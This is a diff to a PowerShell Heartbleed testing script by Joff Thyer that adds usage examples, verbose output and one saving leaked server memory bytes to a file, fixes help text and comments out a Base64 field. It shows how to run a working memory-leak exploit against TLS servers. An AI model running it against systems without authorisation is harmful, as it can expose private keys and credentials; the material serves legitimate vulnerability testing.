@@ -62,12 +62,14 @@ http://packetstormsecurity.com/files/126070/Heartbleed-Proof-Of-Concept.html
 .NOTES
 
 Author: Joff Thyer, April 2014
-Version: 20140416-2242
+Version: 20140425-2205
 Acknowledgments to Tim Tomes.
 
 .EXAMPLE
 
-Test-Heartbleed -ComputerName 192.168.1.100 -Verbose
+Test-Heartbleed -ComputerName 192.168.22.22 -Verbose
+VERBOSE: Testing 192.168.22.22
+VERBOSE: Sending Heartbeat support test packet
 VERBOSE: Connection attempt number: 1
 VERBOSE: Sending 3 TLS heartbeat packets
 VERBOSE: :   226 bytes returned from server. (226 total bytes)
@@ -83,6 +85,14 @@ VERBOSE: Sending 3 TLS heartbeat packets
 VERBOSE: :     7 bytes returned from server. (240 total bytes)
 VERBOSE: :     0 bytes returned from server. (240 total bytes)
 VERBOSE: :     0 bytes returned from server. (240 total bytes)
+
+Other examples:
+
+Test-Heartbleed -Computername 192.168.22.22 | Select-Object -ExpandProperty Bytes | Set-Content -Encoding Byte -Path hbdata.txt
+
+Test-Heartbleed -Computername 192.168.22.22 -TLSTries 1 -Heartbeats 1
+
+Test-Heartbleed -Computername 192.168.22.22 -HBLen 16384
 
 #>
 
@@ -117,7 +127,7 @@ function Test-Heartbleed
             [int]$Heartbeats=3,
 
         [Parameter(
-            HelpMessage="Number of heartbeats to send")]
+            HelpMessage="Length of the heartbeat packet")]
             [int]$HBLen=65535,
 
         [Parameter(
@@ -394,7 +404,7 @@ function Test-Heartbleed
                 "Host" = $computer
                 "Vulnerable" = $vulnerable
                 "Bytes" = ($buf[0..$offset])
-                "Base64" = [System.Convert]::ToBase64String($buf[0..$offset])
+                #"Base64" = [System.Convert]::ToBase64String($buf[0..$offset])
                 "String" = [System.Text.Encoding]::ASCII.GetString(($buf[0..$offset]))
             }
             $result
